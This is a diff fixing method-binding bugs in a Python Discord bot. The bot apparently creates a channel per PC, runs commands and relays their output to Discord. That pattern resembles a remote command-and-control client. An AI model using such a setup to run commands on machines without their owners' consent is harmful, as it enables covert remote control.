@@ -53,14 +53,15 @@ class MyBot(commands.Bot):
         self.API_TOKEN, self.SERVER_ID, self.CATEGORY_ID = load_config(
             CONFIG_FILE)
         self.add_commands()
-        if DEBUG:
-            print(self)
 
     async def on_ready(self):
         print('Hello {0.user} !'.format(self))
         await self.change_presence(activity=discord.Game('👀'))
         await self.create_channel_for_this_pc(self.SERVER_ID, self.CATEGORY_ID)
-
+        
+        if DEBUG:
+            print(self)
+        
         if self.args.pipe:
             # create_pipe(PIPE_PATH)
             if VERBOSE:
@@ -159,7 +160,7 @@ class MyBot(commands.Bot):
             raise Exception(
                 'Channel ID is None, unable to verify if channel was created!')
 
-    async def send_message_to_channel(channel_id: int, message: str):
+    async def send_message_to_channel(self, channel_id: int, message: str):
         """
         Sends a message to a channel
 
@@ -167,7 +168,7 @@ class MyBot(commands.Bot):
             channel_id (int): ID of the channel
             message (str): Message to send
         """
-        channel = MyBot.get_channel(channel_id)
+        channel = self.get_channel(channel_id)
         for msg in split_message(message):
             await channel.send(msg)
 
@@ -194,7 +195,7 @@ class MyBot(commands.Bot):
             if VERBOSE:
                 print(output)
 
-            await MyBot.send_message_to_channel(ctx.channel.id, output.stdout.decode('utf-8'))
+            await self.send_message_to_channel(ctx.channel.id, output.stdout.decode('utf-8'))
 
         @self.command()
         async def file(ctx, arg):
@@ -235,7 +236,7 @@ class MyBot(commands.Bot):
         message = await read_pipe(PIPE_PATH)
         print(str(self.CHANNEL_ID) + " " + message)
         if message:            
-            await MyBot.send_message_to_channel(self.CHANNEL_ID, message)
+            await self.send_message_to_channel(self.CHANNEL_ID, message)
             if DEBUG:
                 print(f"Opened pipe successfully: {message}")
         elif DEBUG:
